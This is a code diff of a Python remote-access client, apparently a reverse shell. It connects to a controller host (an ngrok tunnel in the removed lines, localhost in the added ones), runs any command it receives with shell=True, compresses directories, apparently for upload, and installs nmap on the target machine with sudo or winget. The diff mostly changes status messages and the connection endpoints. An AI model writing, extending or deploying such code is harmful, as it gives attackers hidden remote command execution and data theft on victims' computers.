@@ -7,8 +7,8 @@ import requests
 import platform
 
 
-ip = '0.tcp.sa.ngrok.io'
-port = 15469
+ip = '127.0.0.1' 
+port = 8081
 
 
 def connection(ip, port):
@@ -78,11 +78,11 @@ Manual:
         elif data.startswith("info_ip"):
             obter_informacoes_ip(s)
 
-        elif data.startswith("nmap_installation"):
+        elif data.startswith("nmap_install"):
             install_nmap(s)
 
         elif data.startswith("cls") or data.startswith("clear"):
-            os.system('cls' if os.name == 'nt' else 'clear')
+            clear_screen(s)
 
         else:
             output = subprocess.run(data, shell=True, capture_output=True, text=True)
@@ -103,12 +103,15 @@ def compactar_diretorio(diretorio, arquivo_saida):
                 relativo = os.path.relpath(caminho_completo, diretorio)
                 zipf.write(caminho_completo, relativo)
 
+def clear_screen(s):
+    s.send(b"\n" * 100)
+
 def client_path(s):
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         s.send(b"\n[!] Trying connection with the server...\n")
-        client.connect(('0.tcp.sa.ngrok.io', 12872))
+        client.connect(('127.0.0.1', 8887))
         print('Connected [!]\n')
 
         s.send(b"\n[!] Connection Received from the server.\n ")
@@ -224,30 +227,36 @@ def obter_informacoes_ip(s):
         error = "[ERROR] Solicitation error."
         send_data(s, error)
 
-
 def install_nmap(s):
     system = platform.system()
-    command = "where nmap" if system == "Windows" else "which nmap"
 
-    try:
-        subprocess.run(command, shell=True, check=True)
-        send_data(s, "\n[+] Nmap is already installed.\n")
+    out = subprocess.run("nmap -v", shell=True, capture_output=True, text=True)
+
+    if out.returncode == 0:
+        s.send(b"\n[-] Nmap already installed.\n")
         return
-    except subprocess.CalledProcessError:
-        send_data(s, "\n[!] Nmap not found. Starting installation...\n")
+    else:
+        s.send(b"\n[!] Nmap not found. Starting installation...\n")
 
     if system == 'Windows':
-        send_data(s, "\n[!] Starting Nmap installation on Windows...\n")
-        subprocess.run("winget install Insecure.Nmap", shell=True, check=True)
-        send_data(s, "\n[!] Nmap and Netcat installation completed.\n")
+        s.send(b"\n[!] Starting Nmap installation on Windows...\n")
+        try:
+            subprocess.run("winget install Insecure.Nmap", shell=True, check=True)
+            s.send(b"\n[+] Nmap installation completed successfully.\n")
+        except Exception as e:
+            s.send(f"\n[!] Installation failed: {e}\n".encode())
+            print(f"[!] Installation failed: {e}\n")
         
     elif system == "Linux":
-        send_data(s, "\n[!] Installing Nmap on Linux...\n")
-        subprocess.run("sudo apt install nmap -y", shell=True, check=True)
-        send_data(s, "\n[+] Installation completed.\n")
+        s.send(b"\n[!] Installing Nmap on Linux...\n")
+        try:
+            subprocess.run("sudo apt install nmap -y", shell=True, check=True)
+            s.send(b"\n[+] Installation completed successfully.\n")
+        except Exception as e:
+            s.send(f"\n[!] Installation failed: {e}\n".encode())
+            print(f"[!] Installation failed: {e}\n")
     else:
-        send_data(s, "\nThis operating system is not supported.\n")
-
+        s.send(b"\n[!] This operating system is not supported.\n")
 
 def main():
     while True:
